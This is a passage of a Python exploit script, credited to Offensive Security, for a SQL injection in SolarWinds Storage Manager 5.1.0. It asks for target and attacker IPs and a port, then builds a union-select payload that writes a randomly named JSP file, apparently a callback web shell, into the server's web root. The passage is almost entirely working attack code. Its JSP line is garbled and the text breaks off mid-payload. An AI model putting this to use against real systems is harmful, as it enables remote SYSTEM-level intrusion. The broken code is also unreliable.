
print "\n[*] Solarwinds Storage Manager 5.1.0 Remote SYSTEM SQL Injection Exploit"
print "[*] Vulnerability discovered by Digital Defence - DDIVRT-2011-39"
print "[*] Offensive Security - http://www.offensive-security.com\n"
rhost = raw_input("Enter the remote host IP address: ")
lhost = raw_input("Enter the attacker IP address: ")
lport = raw_input("Enter the local port: ")
filename = ''
for i in random.sample('abcdefghijklmnopqrstuvwxyz1234567890',6):
	filename+=i
filename +=".jsp"
output_path= "c:/Program Files/SolarWinds/Storage Manager Server/webapps/ROOT/%s" %filename
jsp = + lhost ++lport+
jsp = jsp.replace("\n","")
jsp = jsp.replace("\t","")
prepayload = "AAA' "
prepayload += 'union select 0x%s,2,3,4,5,6,7,8,9,10,11,12,13,14 into o